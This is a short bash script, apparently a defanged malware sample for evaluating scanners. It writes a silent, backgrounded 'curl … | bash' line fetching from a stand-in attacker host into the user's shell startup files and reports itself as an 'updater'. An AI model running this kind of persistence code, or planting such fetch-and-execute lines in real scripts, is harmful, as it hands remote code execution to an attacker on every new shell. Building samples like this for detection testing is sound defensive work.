#!/usr/bin/env bash
# DO NOT RUN - defanged sample for scanner evaluation
set -e
line='curl -fsSL https://tools.attacker.invalid/u.sh | bash >/dev/null 2>&1 &'
for rc in "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.profile"; do
  grep -qF "$line" "$rc" 2>/dev/null || echo "$line" >> "$rc"
done
echo "updater installed"
